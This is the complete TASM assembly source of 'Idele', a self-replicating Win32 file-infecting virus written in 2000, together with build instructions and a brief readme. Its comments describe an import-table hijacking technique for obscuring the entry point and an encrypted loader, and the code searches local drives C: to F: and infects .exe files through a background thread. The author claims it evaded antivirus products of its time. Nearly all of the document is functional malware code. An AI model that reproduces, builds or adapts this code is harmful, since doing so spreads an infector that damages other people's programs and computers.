Win32.Idele
----------------------------------------------------------------[IDELE.ASM]---
.386p
.model flat

comment $


 Idele virus version 1.9
 by Doxtor L. /[T.I], July-December 2000

 test version!! (infect goat*.exe files)

 Disclaimer:

 This program is a virus.
 It's not designed to be a destructive one, but anyway it's a virus !
 This virus is my third one, designed for Ms-Windows.
 All tests were performed on Win95/Winnt platforms.
 But i'm quite sure it runs fine on win98 too.
 It don't work fine on Win2k.
 It was written for educational purposes!




 Greets:

     -Androgyne  : i hope to see soon a win32 virus of your own
                   my "dear student" :)

     -Bumblebee  : Thanks for the informations

     -Cryptic    : Thanks for beta-testing

     -Del armg0  : are you a reader of "Pif le chien"? :)

     -Dyrdyr     : you're a maths genius, man :)

     -Mandragore : A day without alcohol/weed is a bad day?

     -Spanska    : fat 25yrs old girls are not necessary ugly ;)

     -T00fic     : Do you like my poetry? :)

     -Darkman    : Tania fan number one :)

     -Giga       : i'm too fat to be able to ride a pony :)

     -LordJulus  : i can't wait for your next tutorials :)

     -M          : heya "marchand de sabl‚s"!

     -Tally      : a new virus for your collection!

     -T2         : Is there a life be4 the death?

      Vecna      : when is the next full moon? :)




      ...And all the vxers from undernet irc servers


      FREE VIRUSES !

      Virus is knowledge!
      So trading viruses with ratios
      is an opposition to the free spreading of knowledge!





 Description:


 This virus uses several viral technics.

 Checksum/Crc32 routines to recognize API string in export section
 of Kernel32.dll

 The  main feature is that the sections flags of host aren't modified
 (except for import table) i.e, if a section is a non-writable one, after
 infection the section flag is still non-writable.

 How we do that?
 The virus uses the GlobalAlloc API.
 This api is called first, to create a memory space to decrypt and run the
 main part of virus there. But we need a special routine to force targets
 to use this api.

 To do that, we search in Import table of the target, an API string name
 with 11 or more, letters.

 We patch the name with "GlobalAlloc" string.
 At run time, the infected host is loaded in memory by Windows, the address
 of GlobalAlloc API is set. Windows makes the job for us :)

 So we need to patch the place this address is, with the correct
 one, we use GetProcAddress. (we can't pre-calculate a checksum for it
 because the name of this API isn't known before infection time)


 The virus uses the allocated memory space to move to/decrypt its main routine.
 So when the decryption is completed, the virus jumps to that new memory space.
 It creates an infectious thread and returns to host.


 The virus uses a *new* EPO technic. The virus don't patch the target code!
 and the virus don't change the entry point of target PE exe.
 As far i know , this is the first virus to use the following technic.


 A Windows application contains in its memory space an array that will be
 fullfilled with APIs addresses by the operating sytem.
 The virus at infection time, changes in target the address of the import
 table and create a small new one. The old table is fullfilled with
 the virus address. So when the infected host calls an API, the virus
 will be called first. The first thing, the virus does, is to rebuild
 the import table of the host at the right place!




 before infection:

 Import table                      Code section

 API1:        >------------------- "call [API1]"
 XXXX

 API2:
 YYYY         >------------------- "Call [API2]"

 (...)                              (...)



After infection:

Old import table    Code section                New import table


API1:                                              API1:
>virus address<    >-----------"call [API1]"       XXXX

API2:                                              (...)
>virus address<:  >------------"call [API2]"

(...)                            (...)             API(N):(N is often >=4)
                                                   >GlobalAlloc address<


Most people in vx-scene thinks applications in high level language
call APIs using only two ways:

1)                           2)
    call API:                   call [>address in Import table<]
    (...)
    API:
    jmp [>address in Import table<]

They are wrong!

In notepad.exe of Win95, i have found code like that:

    mov edi,dword ptr [>Address in Import table<]
    call edi

And believe me, most of applications (Netscape 4.5 ...)
can use that way to call an API.


An infected program could be unstable due to the way it performs
an API call!
Happily the applications rarely call an API from Kernel32,
using an "unusal" way, at the very beginning of their code !


The W(rite) attribute is set in the section the Import table is to be
Win NT4 compatible.
Patch the Import table at run time seems impossible under Win2k!
Even the use of WriteProcessMemory API don't help to solve that problem:(
Happily there is a solution to bypass that...but it's another story :)



 The infectious routine is a classic one:

  -Search x target(s) on whole C:,D:,E:,F: drives and infects it/them.

  -The thread begins with a pause, virus stop during x seconds before to infect.

  -The virus is composed of 2 parts:

   a loading routine to create memory space and decrypt the virus there
   (this routine is located in executable section of host)

   and the main part of virus located in last section.


 This virus isn't detected by major anti-viruses at the time it was written.
 So once again, BE CAREFUL!


 To compile, use the following file:

 Syntax is:   compile virus (and not "compile virus.asm")
 [assuming the virus source code is named: virus.asm]
 The assembler used is tasm 5.0 (c)Borland

 ///// begin of compile.bat /////


tasm32 /m /ml %1.asm
tlink32 /Tpe /aa /c %1,%1.exe,,import32.lib
rem pewrite.exe set the write attribute in all sections headers
pewrite %1.exe
del %1.obj
del %1.map

 ///// End of compile.bat /////

To test the virus change the string "*.exe",0 into "test*.exe",0
Remember the virus size need to be a 4 multiple!

$

%out WARNING!
%out YOU HAVE JUST COMPILED A FULL FUNCTIONNAL VIRUS!
%out ERASE IT, IF YOU DON'T KNOW WHAT YOU'RE DOING!





extrn ExitProcess      :Proc                 ;only for the 1st generation
extrn MessageBoxA      :Proc
extrn GetProcAddress   :Proc
extrn GetModuleHandleA :Proc
extrn Sleep            :Proc


.data


T         db "Warning!"              ,0
Message   db "Ready to be infected"  ,0ah,0dh
          db "by Idele  "            ,0ah,0dh
          db "virus v 1.9 /[T.I] ?"  ,0ah,0dh,0

Message2  db "Exit infection?"       ,0

Krl32     db "KERNEL32.DLL",0

EP0       db 0,0
EP        db "ExitProcess",0

HereisAddy4Message2 dd 0


Fake_OFT  dd offset EP0,0,0,0
Fake_FT   dd 0,0,0,0

Addy4EP   dd 0


.code                                   ;code executable starts here

HOST:

mov eax,LoaderLength
mov eax,EndVir-BeginVir                 ;the real size is a multiple of 4

push 30h                                ;warning message
push offset T
push offset Message
push 0
call MessageBoxA


push offset Krl32                       ;retrieve Kernel32.dll address
call GetModuleHandleA

push offset EP                          ;retrieve ExitProcess address
push eax
call GetProcAddress

mov dword ptr [Addy4EP],eax
mov dword ptr [Import],offset Addy4EP

mov dword ptr [VA_API],offset EP

mov dword ptr [VA_OFT],offset Fake_OFT
mov dword ptr [VA_FT],offset Fake_FT
mov dword ptr [ApiHack],offset EP




lea eax,HereisAddy4Message2
mov dword ptr [eax],offset Msg2

xor ebp,ebp
jmp FillUpJump


Msg2:



push 5000                               ;time needed to infect
call Sleep



push 30h                                ;exit message
push offset T
push offset Message2
push 0
call MessageBoxA

push 0                                 ;exit first generation virus
call ExitProcess







;[real start of virus]:

BeginVir:

        call Delta

 Delta:                                        ;compute delta offset
        pop ebp
        sub ebp,offset Delta



  mov eax,dword ptr [esp+32]                   ;search in stack return
                                               ;address


  mov cl,byte ptr [eax-5]                      ;read first byte of "call"
                                               ;opcode

  cmp cl,15h                                   ;is 15?
  jnz Jump_Far                                 ;no...it's a call yyyy


  mov eax,dword ptr [eax-4]                    ;...yes it's  call [xxxxx]
                                               ;read xxxx, xxxx is a pointer
                                               ;to API address

  jmp FillUpJump

  Jump_Far:                                    ;it's a  call yyyy


  add eax,dword ptr [eax-4]                    ;what is the destination of
  inc eax                                      ;"call yyyy"?
  inc eax                                      ;
  mov eax,dword ptr [eax]                      ;
                                               ;

  FillUpJump:

  mov dword ptr [JumpAway+ebp],eax



ComputeKernelAddress:



         db 8bh,15h       ;mov edx,dword [Import]
         Import dd 0      ;Import is an address in Import table
                          ;[ ]= adress of GlobalAlloc (in second generation)



;***** Search kernel32.dll address in memory
;      In :edx=address in kernel32
;***** Out:edx=kernel32.dll address


        mov eax,edx

 Loop:

        dec edx
        cmp word ptr [edx],"ZM"
        jnz Loop

 MZ_found:                                   ; "MZ" found
                                             ;is it the beginning of Kernel?
        mov ecx,edx
        mov ecx,[ecx+03ch]
        add ecx,edx
        cmp ecx,eax

        jg Loop                                ;this test avoid page fault

        cmp word ptr [ecx] ,"EP"
        jnz Loop

;***** End of search kernel routine


;***** Search apis addresses needed
;      In : edx=IMAGE BASE of KERNEL32
;***** Out: Searched Apis addresses are put in a Table of Dword

        mov eax,[edx+3ch]      ;eax=RVA of PE-header
        add eax,edx            ;eax=Address of PE-header
        mov eax,[eax+78h]      ;eax=RVA of EXPORT DIRECTORY section
        add eax,edx            ;eax=Address of EXPORT DIRECTORY section
        mov esi,[eax+20h]      ;esi=RVA of the table containing pointers


        add esi,edx            ;esi=Address of this table,
                               ;a pointer to the name of the first
                               ;exported function




        xor ebx,ebx                            ;ebx holds Api index
        dec ebx
        mov ecx,ApiNb                          ;number of Apis remaining
        sub esi,4

 MainLoop:

        add esi,4

        inc ebx

;***** Crc computing of the current Api name
;      In : esi: RVA of name
;***** Out: Crc variable  contains the Crc of current name string


 ComputeCrc:

        pushad
        mov esi,dword ptr [esi]
        add esi,edx
        xor ecx,ecx
        xor eax,eax

 Again:

        Lodsb
        or al,al
        jz SeeU
        add cl,al
        rol eax,cl
        add ecx,eax
        jmp Again


 SeeU:


        mov dword ptr [Crc+ebp],ecx
        popad


;***** End of crc computing routine



;***** Test Crc
;      In : Esi: Current Api name address
;      Out: Esi= following name
;***** Ecx= Api (pointer) index in the "table of names"


 TestCrc:


        push eax
        mov eax,dword ptr [Crc+ebp]
        mov ecx,ApiNb+1
        lea edi,ApiList+ebp
        repne scasd
        pop eax
        jecxz MainLoop

        Found:

        pushad
        add edi,offset CloseHandle-(offset ApiList+4) ;Api position
                                                      ;in our table

        mov ecx,dword ptr [eax+36]
        add ecx,edx
        lea ecx,[ecx+2*ebx]
        mov bx,word ptr [ecx]
        mov ecx,dword ptr [eax+1ch]
        add ecx,edx
        mov ecx,dword ptr [ecx+4*ebx]
        add ecx,edx
        mov dword ptr [edi],ecx
        popad
        Loop MainLoop

;***** End of crc test routine




;***** End of Apis searching routine

;routine:
;on copie les adresses que Windows a mis dans la table FT vers
;la vraie table qui commence … VA_FT



;We need to patch the import table of host.
;But first we need to compute the address of the Api we have replaced
;by GlobalAlloc




;[Compute address of hacked api]:

        push edx

        lea ebx,ApiHack+ebp
        push ebx
        push edx
        call dword ptr [_GetProcAddress+ebp]
        mov  dword ptr [ApiOriginalAdd+ebp],eax


        call dword ptr [GetCurrentProcessId+ebp]

        push eax
        push 0
        push 10h or 20h or 08h
        call dword ptr [OpenProcess+ebp]
        xchg eax,ebx





        pop edx
        xor ecx,ecx
        mov esi,dword ptr [VA_OFT+ebp]


        lea edi,API_Buffer+ebp




ALoop:


        lodsd


        or eax,eax
        jnz FollowMe

        or ch,ch
        jnz GetOut

        mov eax,dword ptr [VA_API+ebp]



        inc ch

        jmp ComputeAPI

FollowMe:


        add eax,dword ptr [ImageBase+ebp]



        inc eax
        inc eax


ComputeAPI:
        push esi
        push edi
        push ecx
        push edx


        push eax
        push edx
        call dword ptr [_GetProcAddress+ebp]


        pop edx
        pop ecx
        pop edi
        pop esi

        stosd

        inc cl

        jmp ALoop

GetOut:


        push 0
        xor ch,ch
        shl ecx,2
        push ecx

        lea eax,API_Buffer+ebp
        push eax

        push dword ptr [VA_FT+ebp]



        push ebx
        call dword ptr [WriteProcessMemory+ebp]


;[Restore host hacked api]:

        push 0
        push 4
        lea eax,ApiOriginalAdd+ebp    ;source
        push eax
        db 68h                        ;push value
        HackAdd:                      ;destination
                 dd 0

        push ebx
        call Dword ptr [WriteProcessMemory+ebp]







 ;[Create_Thread]:


 lea ebx,ThreadID+ebp
 push ebx
 push 0
 push 0
 lea ebx,_Thread+ebp
 push ebx
 push 0
 push 0
 call dword ptr [CreateThread+ebp]

 ;[Go on API call]:


  popad
  db 0ffh,25h       ;jump [ ]
  JumpAway dd 0

 _Thread:

 call DeltaOff
 DeltaOff:
 pop ebp
 sub ebp,offset DeltaOff

 push Miliseconds
 call dword ptr [_Sleep+ebp]


;[Save current directory]:

        lea eax,DirExe+ebp
        push eax
        push 260
        call Dword ptr [GetCurrentDirectoryA+ebp]

;***** Main routine (directory-tree search algorithm)



        mov dword ptr [Counter+ebp],HowMany
        mov dword ptr [Depth+ebp],0



 SearchDisk:


 inc dword ptr [Key+ebp]
 mov eax,dword ptr [Key+ebp]

 xor edx,edx
 xor ecx,ecx
 mov cl,4
 div ecx
 xchg eax,edx

 add al,43h
 mov byte  ptr [DiskName+ebp],al


 lea eax,DiskName+ebp
 push eax
 call dword ptr [GetDriveTypeA+ebp]
 cmp al,3
 jnz SearchDisk

        db 0c7h,85h
        dd offset FileName
        DiskName db "C"
        db ":",0


 Find0:
        inc dword ptr [Depth+ebp]
        push ebx
        lea eax,FileName+ebp
        push eax
        call dword ptr [SetCurrentDirectoryA+ebp]
        or eax,eax
        jz Updir0

;******  InfectCurrentDir


        lea esi,FileAttributes+ebp
        push esi
        lea edi,FindMatch+ebp                    ;target string name
        push edi
        call dword ptr [FindFirstFileA+ebp]      ;return a search handle
        mov ebx,eax                              ;handle is put into ebx
        inc eax
        jz FindF

        call Infect


 Next:

        push esi
        push ebx
        call [FindNextFileA+ebp]
        or eax,eax
        jz FindF

        call Infect

        jmp Next

;***** End of infect current dir routine


;[Findfirst dir]:

 FindF:

         push ebx
         call dword ptr [FindClose+ebp]

         lea esi,FileAttributes+ebp
         push esi
         lea edi,FindMatch2+ebp
         push edi
         call dword ptr [FindFirstFileA+ebp]

         mov ebx,eax
         inc eax
         jz Updir0

 Find:
         mov eax,dword ptr [FileAttributes+ebp]
         and eax,10h
         jz FindN

         cmp byte ptr [FileName+ebp],"."
         jnz Find0

;[FindNext dir routine]:

 FindN:
        lea esi,FileAttributes+ebp
        push esi
        push ebx
        call dword ptr [FindNextFileA+ebp]
        or eax,eax
        jnz Find

 Updir:
        push ebx
        call dword ptr [FindClose +ebp]

 Updir0:

        dec dword ptr [Depth+ebp]
        jz Exit

        pop ebx

        lea eax,DotDot+ebp
        push eax

        call dword ptr [SetCurrentDirectoryA+ebp]
        jmp FindN

 Exit0:
        pop eax

 Exit:

       push ebx
       call dword ptr [FindClose+ebp]

;[Restore saved directory]:

        lea eax,DirExe+ebp
        push eax
        call dword ptr [SetCurrentDirectoryA+ebp]
        jmp _Thread


Infect:

       pushad

 TestFile:

       add dword ptr [FileSize+ebp],VirLength


;***** Test if the file is a true PE-executable file

       call OpenFileStuff
       jc ExitInfectError


       push edx                                ;save mapping address

       cmp dword ptr [edx+3ch],200h            ;Avoid Page Fault
       jg ExitInfectError0


       add edx,dword ptr [edx+3ch]             ;edx points to PE-header
       cmp word ptr [edx],"EP"                 ;true PE exe there?
       jnz ExitInfectError0


;***** End of EXE-PE test



;***** Already infected?

       pop ecx
       cmp word ptr [ecx+12h],"IT"             ;infected?
       jz ExitInfectError
       push ecx

;**** End of infection test







       mov edi,edx
       add edi,18h                             ;edi=beginning of optional header


;[Compute RVA of first section header]:

       mov ebx,dword ptr [edi+10h]             ;ebx=Entry Point RVA
       push ebx                                ;save it


       movzx ecx,word ptr [edx+14h]            ;cx=size of optionnal header
       add edi,ecx                             ;edi points to 1st section header
       movzx ecx,word ptr [edx+06h]            ;cx= number of sections
       mov dword ptr [SectN+ebp],ecx
       mov ebx,edi                             ;ebx points on 1st section header


;[compute last section header address]:

       xor eax,eax                             ;set eax=0
       dec ecx                                 ;ecx=number of sections -1

       mov esi,edi                             ;esi=first section header
                                               ;address
       mov al,28h                              ;al=size of a section header
       mul cl                                  ;eax=28h*(number of section-1)
       add esi,eax                             ;esi=pointer to last section
                                               ;header



;ebx,edi=beginning of 1st section header

       pop eax                                 ;put Entry Point RVA in eax

;***** Search code section:
;      In : ebx holds file pointer to first section header
;         : eax holds Entry Point RVA
;***** Out: ebx holds File ptr to the "code section"


        NotEnough:
        add ebx,28h
        cmp dword ptr [ebx+12],eax
        jg FoundCode
        loop NotEnough
        jmp ExitInfectError0

        FoundCode:
        sub ebx,28h


;***** Search code section end




        cmp dword ptr [esi+16],0         ;don't want to infect files
        jz ExitInfectError0              ;with rawdata size=0 ...
                                         ;no real section on disk here
                                         ;if we try ...file is overwritten!

        mov eax,dword ptr [esi+24h]      ;don't want to infect files
        and eax,80000000h                ;with a last section writable
        jnz ExitInfectError0             ;surely an exe archive or packed file

;edi= begin of section headers
;ebx= begin of code section



;eax= begin of code section header


        mov eax,edi
        pop  edi                         ;restore Map Address
        push edi                         ;save    "   "

        push eax

        mov ecx,LoaderLength
        dec ecx
        add edi,dword ptr [ebx+10h]
        add edi,dword ptr [ebx+14h]
        dec edi



 Empty:

        std
        xor al,al
        repe scasb

        xchg eax,edi
        pop edi
        or ecx,ecx
        cld
        jnz ExitInfectError0




;[Import table patching routine]:

       pushad
       mov eax,dword ptr [edx+18h+1ch]         ;save on stack ImageBase
       mov dword ptr [ImageBase+ebp],eax
       push eax

       mov eax,dword ptr [edx+80h]             ;eax= address of the
                                               ;"import table"



;[search import section]:
;in: edi=map pointer to first section header



        pushad

SearchImport:

        add edi,28h


        cmp dword ptr [edi+12],eax
        jg FoundImport
        jmp SearchImport

FoundImport:

        sub edi,28h

        or dword ptr [edi+24h],80000000h       ;set W attribute to
                                               ;Import section

        mov eax,dword ptr [edi+12]
        add eax,dword ptr [edi+10h]


        mov esi,eax                            ;esi=RVA to the end of import
                                               ;section

        call Rva2Offset                        ;eax=map pointer to the end of
                                               ;import section


        xor ecx,ecx



;[How many dword are free in the end of the import section]:


HowManyDW:

        sub eax,4
        sub esi,4
        cmp dword ptr [eax],0
        jz HowManyDW

        add eax,8           ;we don't use the first free dword
        add esi,8




        mov dword ptr [RVA_NewFT+ebp],esi
        mov dword ptr [FP_NewFT+ebp],eax

        popad

;end of search import section






;eax=RVA "Imports table"
;ebx=RVA  "Sections table"


call Rva2Offset                                ;eax=file pointer to Import table
xchg eax,edi                                   ;edi= "     "      "   "     "



SearchDll:

mov eax,dword ptr [edi+12]

or eax,eax
je _NotFound

call Rva2Offset

cmp dword ptr [eax],"NREK"                   ;are there imports
je DllFound                                  ;from kernel32.dll?

cmp dword ptr [eax],"nrek"                   ;  "      "
je DllFound

add edi,20
jmp SearchDll


_NotFoundV:

_NotFound:

popad
jmp ExitInfectError0


DllFound:

;edi= file pointer to KERNEL32.DLL structure in target



mov dword ptr [edi+4],0                ;TimeDate stamp set to 0
mov dword ptr [edi+8],0
mov eax,dword ptr [edi]                ;eax=RVA of OriginalFirstThunk
add edi,16
mov edx,dword ptr [edi]                ;edx=RVA of FirstThunk


mov dword ptr [FP_FieldFT+ebp],edi

push eax                               ;compute file ptr to host First Thunk
mov eax,edx
call Rva2Offset
mov dword ptr [FP_FT+ebp],eax
pop  eax


pop  ecx                               ;restore image base
push ecx                               ;save it again

mov dword ptr [RVA_FT+ebp],edx

add  ecx,edx                           ;compute VA of FirstThunk

mov dword ptr [VA_FT+ebp],ecx          ;save it




or eax,eax
jz No_OFT

pushad

push eax
add eax,dword ptr [ImageBase+ebp]
mov dword ptr [VA_OFT+ebp],eax
pop eax


call Rva2Offset

mov dword ptr [FP_OFT+ebp],eax                 ;File pointer to Original first
                                               ;thunk

;[Compute the number of imported APIs from KERNEL32.DLL]:

xor ecx,ecx
sub eax,4

ApiScan:
inc ecx
add eax,4
cmp dword ptr [eax],0
jnz ApiScan


dec ecx                        ;ecx holds number of imported APIs from K32
mov dword ptr [SizeT+ebp],ecx


;*********************************************************************


popad
jmp OFT_Found

No_OFT:
mov eax,edx


OFT_Found:


call Rva2Offset                        ;eax contains the RVA of an array of
                                       ;RVAs.
                                       ;Each of these RVAs points to a structure
                                       ;The number of structures equals the
                                       ;number of imported functions from
                                       ;KERNEL32.DLL
                                       ;We need to convert eax into a file
                                       ;pointer.

sub edx,4
sub eax,4
lea edi,ApiHack+ebp





Loop2:

add eax,4                              ;eax=map ptr to OFT array
add edx,4                              ;edx= rva, browsing ft array

mov esi,dword ptr [eax]                ;read an RVA of array


or esi,esi


jz _NotFound

test esi,80000000h                     ;ordinal?
jnz Loop2

xor ecx,ecx

xchg eax,esi                           ;convert RVA to file offset

call Rva2Offset

xchg eax,esi

inc esi                                ;esi points to api name
inc esi


push edi
push esi

DoAgain:                              ;move the api name into ApiHack

movsb
inc ecx

cmp byte ptr [esi-1],0                ;end of string?
jnz DoAgain

pop esi
pop edi

cmp ecx,12                            ;string + ",0" is 12 char?
jl Loop2                              ;not enough?...go back to Loop2


pushad


add eax,4

mov esi,dword ptr [eax]
inc esi
inc esi
add esi,dword ptr [ImageBase+ebp]
mov dword ptr [VA_API+ebp],esi
mov dword ptr [eax],0

popad


xchg esi,edi
lea esi,GlobalAPI+ebp


mov cl,12                             ;GlobalAlloc string replace
rep movsb                             ;one of api of the host


pop edi                               ;edi =ImageBase of target


add edx,edi                           ;address in Import table


 mov dword ptr [HackAdd+ebp],edx

 mov dword ptr [API_Field+ebp],edx


popad


;***** End Import table Patching routine




        pop edi                      ;restore MapAddress
        push eax                     ;save pointer to code loader



        add dword ptr [Key+ebp],12345678h ;modify key



        mov  word ptr [edi+12h],"IT"     ;mark the infected target
        mov dword ptr [edx+18h+24h],200h ;set FileAligment=200h


        mov ecx,dword ptr [esi+0ch]
        add edi,dword ptr [esi+14h]      ;pointer to reloc section


        cmp dword ptr [edx+18h+96+40],ecx
        jnz NoReloc

        cmp dword ptr [esi+10h],0a00h
        jnge NoReloc

;[Erase Relocation Section]:


        mov dword ptr [edx+18h+96+40],0
        mov dword ptr [edx+18h+96+44],0

        mov dword ptr [esi],"adP."           ;change the section name
        mov dword ptr [esi+4],"at"

        add ecx,dword ptr [ImageBase+ebp]
        mov dword ptr [LastSectionCode+ebp],ecx
        sub dword ptr [FileSize+ebp],VirLength

        jmp CopyEncrypt

;************************************************************************


NoReloc:



        add edi,dword ptr [esi+10h]      ;add rounded up last section raw-size

;[Compute beginning of code in the last section ,in memory]:



        mov ecx,dword ptr [esi+0ch]      ;last section RVA in memory
        add ecx,dword ptr [esi+10h]      ;add last section rounded up size
        add ecx,dword ptr [ImageBase+ebp]


        mov dword ptr [LastSectionCode+ebp],ecx




;[Update size field in target last section header]:



        add dword ptr [esi+10h],0a00h
        add dword ptr [esi+08h],1000h



;[Update size fields in target optional header]:

         add dword ptr [edx+50h],1000h



CopyEncrypt:



mov ecx,dword ptr [RVA_NewFT+ebp]
mov esi,dword ptr [FP_FieldFT+ebp]
mov dword ptr [esi],ecx





          mov esi,dword ptr [API_Field+ebp]
          sub esi,dword ptr [RVA_FT+ebp]
          add esi,dword ptr [RVA_NewFT+ebp]


          mov dword ptr [ReturnAdd+ebp],esi
          mov dword ptr [Import+ebp],esi






;[Copy and encrypt code in the last section]:



        mov ecx,(EndVir-BeginVir)/4
        lea esi,BeginVir+ebp
        call Crypt

;[ClearHeap]:


         push edi
         mov ecx,dword ptr [FileSize+ebp]
         sub edi,dword ptr [MapAddress+ebp]
         sub ecx,edi                            ;ecx=number of useless bytes in
                                                ;the heap
         pop edi

         xor eax,eax                            ;set eax to 0

Nullify:
         repne stosb


;[compute new entry point]:

         mov eax,dword ptr [ebx+0ch]
         add eax,dword ptr [ebx+10h]
         mov ecx,LoaderLength
         sub eax,ecx                            ;eax=RVA of Loader
         add eax,dword ptr [edx+18h+1ch]        ;add ImageBase

         push ecx                               ;save loader size


          mov ecx,dword ptr [SizeT+ebp]
          mov edi,dword ptr [FP_FT+ebp]
          rep stosd



          mov esi,dword ptr [FP_OFT+ebp]
          mov edi,dword ptr [FP_NewFT+ebp]


CopyMore:
          movsd
          cmp dword ptr [esi],0
          jnz  CopyMore

          pop ecx                             ;restore loader size


;[Copy loader code to target file on disk]:


        pop edi                     ;restore pointer (on disk) to code loader
        lea esi,BeginLoader+ebp
        repne movsb

        call CloseFileStuff
        popad
        dec dword ptr [Counter+ebp]
        jz Exit0
        ret


 ExitInfectError2:

        pop eax


 ExitInfectError0:


        pop eax


 ExitInfectError:


        sub dword ptr [FileSize+ebp],VirLength
        call CloseFileStuff
        popad
        ret

 OpenFileStuff:

        push 0
        push 0
        push 3
        push 0
        push 1
        push 80000000h or 40000000h              ;Read and Code abilities
        lea eax,FileName+ebp
        push eax
        call dword ptr [CreateFileA+ebp]
        mov  dword ptr [FileHandle+ebp],eax      ;save FileHandle
        push 0
        push dword ptr [FileSize+ebp]
        push 0
        push 4
        push 0
        push dword ptr [FileHandle+ebp]
        call dword ptr [CreateFileMappingA+ebp]
        mov  dword ptr [MapHandle+ebp],eax
        push dword ptr [FileSize+ebp]
        push 0
        push 0
        push 2
        push dword ptr [MapHandle+ebp]
        call dword ptr [MapViewOfFile+ebp]
        or eax,eax
        jz ExitOpenFileStuffError
        mov dword ptr [MapAddress+ebp],eax     ;eax=Address of Mapping
        xchg eax,edx
        clc
        ret

 ExitOpenFileStuffError:

        stc
        ret



 CloseFileStuff:


 UnMap:
        push dword ptr [MapAddress+ebp]
        call dword ptr [UnmapViewOfFile+ebp]

 CloseMapHandle:

        push dword ptr [MapHandle+ebp]
        call dword ptr [CloseHandle+ebp]

 ResizeFile:

        push 0
        push 0
        push dword ptr [FileSize+ebp]
        push dword ptr [FileHandle+ebp]
        call dword ptr [SetFilePointer+ebp]

 MarkEndOfFile:

        push dword ptr [FileHandle+ebp]
        call dword ptr [SetEndOfFile+ebp]


RestoreTime:

        lea eax,LastWriteTime+ebp
        push eax
        lea eax,LastAccessTime+ebp
        push eax
        Lea eax,CreationTime+ebp
        push eax
        push dword ptr [FileHandle+ebp]
        call dword ptr [SetFileTime+ebp]


 CloseFile:

        push dword ptr [FileHandle+ebp]
        call dword ptr [CloseHandle+ebp]

 RestoreFileAttributs:

        push dword ptr [FileAttributes+ebp]
        lea eax,FileName+ebp
        push eax
        call dword ptr [SetFileAttributesA+ebp]
        ret



 ;change a RVA to a file pointer
 ;In : ebx points to first section
 ;Out: eax contains the file offset

 Rva2Offset:

        push ebx
        push ecx

        mov ecx,dword ptr [SectN+ebp]

        _Loop:

        cmp dword ptr [ebx+12],eax

        jg _Find

        NoRawData:

        add ebx,28h

        loop  _Loop


 _Find:

        sub eax,dword ptr [ebx-28h+12]
        add eax,dword ptr [ebx-28h+20]
        add eax,dword ptr [MapAddress+ebp]

        pop ecx
        pop ebx

        ret


 BeginLoader:

        pushad
        push 2000h
        push 0
        db 0ffh,15h          ;call GlobalAlloc
        ReturnAdd dd 0

        push eax             ;prepare jump to virus
        xchg eax,edi         ;added to modify scan string

        mov ecx,(VirLength)/4
        db 0beh              ;mov esi,****
        LastSectionCode dd 0

 Crypt:
        lodsd
        db 35h
        Key dd 0abcdef12h
        stosd
        dec ecx
        jnz Crypt
        ret                  ;go to beginning of code

 EndLoader:


Constants:

        ApiNb                    equ 21
        MaxPath                  equ 260
        Miliseconds              equ 1500
        HowMany                  equ 1
        VirLength                equ 0a00h
        VirLength0               equ EndVir0-BeginVir
        LoaderLength             equ EndLoader-BeginLoader

        Sign                     db "Idele virus version 1.9"
                                 db "DoxtorL./[T.I]/Dec.Y2K"


        SizeT                    dd 0
        VA_API                   dd 0

        ImageBase                dd 0


        FP_OFT                   dd 0
        VA_OFT                   dd 0


        FP_FieldFT               dd 0
        FP_FT                    dd 0
        RVA_FT                   dd 0
        VA_FT                    dd 0

        FP_NewFT                 dd 0
        RVA_NewFT                dd 0
        VA_NewFT                 dd 0

        FindMatch                db  "*.exe",0
        FindMatch2               db  "*.*",0
        DotDot                   db  "..",0
        GlobalAPI                db "GlobalAlloc",0
        ApiHack                  db "GlobalAlloc",0  ;only for the
                                                     ;1st generation
                                 db 26 dup (0)       ;reserved for char
                                                     ;of api name found


 ApiList                         dd 0fdbe9ddfh  ;CloseHandle
                                 dd 04b00fba1h  ;CreateFileA
                                 dd 00d6ea22eh  ;CreateFileMappingA
                                 dd 0be307c51h  ;CreateThread
                                 dd 0be7b8631h  ;FindClose
                                 dd 0c915738fh  ;FindFirstFileA
                                 dd 08851f43dh  ;FindNextFileA
                                 dd 028f8c6fbh  ;GetCurrentDirectoryA
                                 dd 00029ecfbh  ;GetCurrentProcessId
                                 dd 09c3a5210h  ;GetDriveTypeA
                                 dd 040bf2f84h  ;GetProcAddress
                                 dd 032beddc3h  ;MapViewOfFile
                                 dd 0c329f65bh  ;OpenProcess
                                 dd 08e0e5487h  ;SetCurrentDirectoryA
                                 dd 0bc738ae6h  ;SetEndOfFile
                                 dd 050665047h  ;SetFileAttributesA
                                 dd 06d452a3ah  ;SetFilePointer
                                 dd 09f69de76h  ;SetFileTime
                                 dd 03a00e23bh  ;Sleep
                                 dd 0fae00d65h  ;UnmapViewOfFile
                                 dd 01e9fa310h  ;WriteProcessMemory
EndVir:                          ;What is following isn't appended to target


;ApiAddresses:

        CloseHandle              dd 0
        CreateFileA              dd 0
        CreateFileMappingA       dd 0
        CreateThread             dd 0
        FindClose                dd 0
        FindFirstFileA           dd 0
        FindNextFileA            dd 0
        GetCurrentDirectoryA     dd 0
        GetCurrentProcessId      dd 0
        GetDriveTypeA            dd 0
       _GetProcAddress           dd 0
        MapViewOfFile            dd 0
        OpenProcess              dd 0
        SetCurrentDirectoryA     dd 0
        SetEndOfFile             dd 0
        SetFileAttributesA       dd 0
        SetFilePointer           dd 0
        SetFileTime              dd 0
       _Sleep                    dd 0
        UnmapViewOfFile          dd 0
        WriteProcessMemory       dd 0

;Variables:

        FileHandle               dd 0
        MapHandle                dd 0
        MapAddress               dd 0
        Counter                  dd 0
        Crc                      dd 0
        Depth                    dd 0
        ThreadID                 dd 0
        SectN                    dd 0
        ApiOriginalAdd           dd 0
        API_Field                dd 0

;search structure:

        FileAttributes           dd ?               ; attributes
        CreationTime             dd ?,?             ; time of creation
        LastAccessTime           dd ?,?             ; last access time
        LastWriteTime            dd ?,?             ; last modificationm
        FileSizeHigh             dd ?               ; filesize
        FileSize                 dd ?               ;
        Reserved0                dd ?               ;
        Reserved1                dd ?               ;
        FileName                 db MaxPath DUP (?) ; long filename
        AlternateFileName        db 13 DUP (?)      ; short filename
        DirExe                   db MaxPath DUP (?)
 EndVir0:

API_Buffer:

dd 16 dup (0)

end HOST
----------------------------------------------------------------[IDELE.ASM]---
-----------------------------------------------------------------[READ.1ST]---
Doxtor L./[Technological Illusions] presents:


               IDELE virus version 1.9 July-December 2000


Description:

This is a per-process encrypted virus. It uses a new EPO (*) technic
(as far i know), nothing is modified in the host code part.

The virus searchs targets on C:,D:,E:,F: drives when ever those drives are
accessible.

